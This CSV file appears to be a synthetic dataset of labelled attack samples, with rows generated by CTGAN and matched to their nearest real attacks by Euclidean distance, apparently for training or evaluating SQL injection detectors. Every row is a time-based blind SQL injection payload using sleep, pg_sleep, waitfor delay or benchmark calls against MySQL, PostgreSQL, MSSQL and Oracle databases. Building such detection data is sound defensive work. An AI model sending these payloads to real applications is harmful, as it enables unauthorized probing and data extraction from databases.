id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000029,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000055,7.322795005781052
CTGAN_000030,attack,time,1'||  (  select 'xemx' from dual where 4683  =  4683 or sleep  (  5  )  #,nearest_attack_euclidean,R000209,7.472627459648707
CTGAN_000031,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim",nearest_attack_euclidean,R000228,5.172136369730935
CTGAN_000032,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000259,6.082938155018014
CTGAN_000033,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000215,6.4643047223927175
CTGAN_000034,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000087,6.38871790340443
CTGAN_000035,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000094,7.248092778799942
CTGAN_000036,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",nearest_attack_euclidean,R000151,6.020514851971101
CTGAN_000037,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000259,6.767584581501395
CTGAN_000038,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000074,5.086950938067168
CTGAN_000039,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000164,6.945441841744661
CTGAN_000040,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000268,5.885564063971684
CTGAN_000041,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000081,6.729727802006873
CTGAN_000042,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000074,7.694344505641633
CTGAN_000043,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000259,6.588359585890939
CTGAN_000044,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000164,6.446861465076771
CTGAN_000045,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000076,7.076729354943768
CTGAN_000046,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000004,6.258342237266561
CTGAN_000047,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000193,7.532927176868312
CTGAN_000048,attack,time,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000020,5.6738763527700735
CTGAN_000049,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000282,5.573576648177449
CTGAN_000050,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000259,5.160752501323364
CTGAN_000051,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000136,8.666578600481088
CTGAN_000052,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000311,5.590223716468887
CTGAN_000053,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000155,7.343882345475901
CTGAN_000054,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000026,6.314586218837283
CTGAN_000055,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000301,5.542596741497553
CTGAN_000056,attack,time,"1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000122,6.985297119540865
CTGAN_000057,attack,time,1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000192,7.231529772507075
CTGAN_000058,attack,time,"1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000122,7.862498140029116
CTGAN_000059,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000065,5.48122093932523
CTGAN_000060,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R000119,7.733312235919434
CTGAN_000061,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,nearest_attack_euclidean,R000270,7.2719041541760605
CTGAN_000062,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000021,4.998398264315708
CTGAN_000063,attack,time,"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000225,6.085185616296117
CTGAN_000064,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R000296,7.897326433398039
CTGAN_000065,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000074,7.492951060081637
CTGAN_000066,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000268,6.47098318496648
CTGAN_000067,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847",nearest_attack_euclidean,R000154,7.899413809430744
CTGAN_000068,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000021,5.902744662779655
CTGAN_000069,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000037,7.163339175892871
CTGAN_000070,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000172,7.472300462884598
CTGAN_000071,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000022,6.1171322864118105
CTGAN_000072,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000159,6.489199737812854
CTGAN_000073,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000193,7.78087686801729
CTGAN_000074,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000268,6.866595774701871
CTGAN_000075,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000259,6.931533829397377
CTGAN_000076,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000095,7.298293237288438
CTGAN_000077,attack,time,"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000225,6.002541439182246
CTGAN_000078,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000259,5.301896171816922
CTGAN_000079,attack,time,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000065,6.6068023719688735
CTGAN_000080,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000009,6.215925913624115
CTGAN_000081,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000311,5.2888713352585786
CTGAN_000082,attack,time,"1%' or elt  (  6272  =  6272,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000202,7.1883819383248815
CTGAN_000083,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000035,7.263194176892176
CTGAN_000084,attack,time,1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000231,6.6161525519332915
CTGAN_000085,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000138,5.957222865083844
CTGAN_000086,attack,time,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000156,6.8409566997691975
CTGAN_000087,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,nearest_attack_euclidean,R000126,6.029711336704242
CTGAN_000088,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000074,8.28414204463233
CTGAN_000089,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000259,6.118313440063472
CTGAN_000090,attack,time,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,nearest_attack_euclidean,R000153,8.203326325291386
CTGAN_000091,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000094,7.361265994714417
CTGAN_000092,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik,nearest_attack_euclidean,R000226,6.495108785255369
CTGAN_000093,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000067,6.6433600219678155
CTGAN_000094,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000259,8.736102097245523
CTGAN_000095,attack,time,"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000225,4.671792073506073
CTGAN_000096,attack,time,"1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000122,6.700445936290891
CTGAN_000097,attack,time,"1'+  (  select papc where 8900  =  8900 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000200,6.581732978489006
CTGAN_000098,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000055,6.514543042223202
CTGAN_000099,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000136,8.447381281935476
CTGAN_000100,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000172,8.942279268811712
CTGAN_000101,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim",nearest_attack_euclidean,R000228,7.6744420939098985
CTGAN_000102,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",nearest_attack_euclidean,R000232,5.735149482123849
CTGAN_000103,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000159,7.578121695408322
CTGAN_000104,attack,time,"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""%""  =  """,nearest_attack_euclidean,R000312,6.7351718957433135
CTGAN_000105,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000165,6.011407607814301
CTGAN_000106,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,nearest_attack_euclidean,R000126,7.39243094238706
CTGAN_000107,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000155,7.2397749345147036
CTGAN_000108,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000159,6.700458316953083
CTGAN_000109,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000094,5.733356703047937
CTGAN_000110,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000090,8.186422968464395
CTGAN_000111,attack,time,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",nearest_attack_euclidean,R000068,5.703695344298864
CTGAN_000112,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000081,5.8861246094173465
CTGAN_000113,attack,time,"1'+  (  select vxax where 9036  =  9036 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000263,5.898876947548
CTGAN_000114,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""ckht""  =  ""ckht",nearest_attack_euclidean,R000289,7.349701835160503
CTGAN_000115,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000271,7.273472965119023
CTGAN_000116,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000094,5.334981585285864
CTGAN_000117,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000023,5.837411091684799
CTGAN_000118,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",nearest_attack_euclidean,R000057,5.691643956531674
CTGAN_000119,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000282,6.552955431417031
CTGAN_000120,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000259,5.76800419280909
CTGAN_000121,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000076,4.7144928915574535
CTGAN_000122,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000217,7.528322048168781
CTGAN_000123,attack,time,1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,nearest_attack_euclidean,R000054,6.167100458303875
CTGAN_000124,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000259,5.987316467620609
CTGAN_000125,attack,time,"1""  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000255,7.542484072814883
CTGAN_000126,attack,time,"1%' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '%'  =  '",nearest_attack_euclidean,R000118,6.580568363108284
CTGAN_000127,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000080,6.672272027205282
CTGAN_000128,attack,time,1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000143,5.797083325911036
CTGAN_000129,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000193,6.6906163848578855
CTGAN_000130,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000215,5.603116566646589
CTGAN_000131,attack,time,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,nearest_attack_euclidean,R000153,7.461413239881736
CTGAN_000132,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000159,7.668116587366976
CTGAN_000133,attack,time,"1%""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000243,6.6963963519041805
CTGAN_000134,attack,time,"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000216,7.926992843892807
CTGAN_000135,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000037,7.71626149350101
CTGAN_000136,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000193,6.7076661332625935
CTGAN_000137,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000282,6.759088449489413
CTGAN_000138,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000193,5.9636052297848146
CTGAN_000139,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000150,6.140367896265207
CTGAN_000140,attack,time,select sleep  (  5  )   and    (    (   'srfc' like 'srfc,nearest_attack_euclidean,R000056,6.146503836987394
CTGAN_000141,attack,time,"1%'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000196,5.88093704271222
CTGAN_000142,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000081,7.629620617526893
CTGAN_000143,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000311,7.219985843220453
CTGAN_000144,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000172,5.722865489459597
CTGAN_000145,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000019,6.545861676392779
CTGAN_000146,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""fvrq""  =  ""fvrq",nearest_attack_euclidean,R000251,7.218698805541907
CTGAN_000147,attack,time,"1""  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000225,7.262740985672265
CTGAN_000148,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000127,5.64000804739
CTGAN_000149,attack,time,"1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000122,4.769849462112353
CTGAN_000150,attack,time,"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """,nearest_attack_euclidean,R000062,8.18976547645689
CTGAN_000151,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",nearest_attack_euclidean,R000151,8.364406277855883
CTGAN_000152,attack,time,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000020,7.4302133788251945
CTGAN_000153,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",nearest_attack_euclidean,R000232,6.674963793221819
CTGAN_000154,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000259,5.925843296479074
CTGAN_000155,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000074,7.574567543097372
CTGAN_000156,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000136,6.923409387929952
CTGAN_000157,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000040,4.745630137377113
CTGAN_000158,attack,time,1'  )   where 8776  =  8776 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000093,6.621270919536771
CTGAN_000159,attack,time,"1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000055,5.629801287322807
CTGAN_000160,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",nearest_attack_euclidean,R000075,5.871471767453745
CTGAN_000161,attack,time,"1'   )    )    as hbdi where 6758  =  6758 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000227,6.903002674172761
CTGAN_000162,attack,time,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R000156,7.2387019178763605
CTGAN_000163,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000021,6.974550406218107
CTGAN_000164,attack,time,"1'   )    )    as hbdi where 6758  =  6758 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000227,6.877397049178303
CTGAN_000165,attack,time,"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R000224,6.52980047849234
CTGAN_000166,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",nearest_attack_euclidean,R000119,6.933733067680701
CTGAN_000167,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000159,7.088398467341397
CTGAN_000168,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000193,6.807895672202488
CTGAN_000169,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000259,7.122434361692577
CTGAN_000170,attack,time,"1""  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000255,6.599013655778034
CTGAN_000171,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000003,6.711349829631626
CTGAN_000172,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000016,7.007746044450728
CTGAN_000173,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""ckht""  =  ""ckht",nearest_attack_euclidean,R000289,7.175053745959869
CTGAN_000174,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000074,8.047985214611368
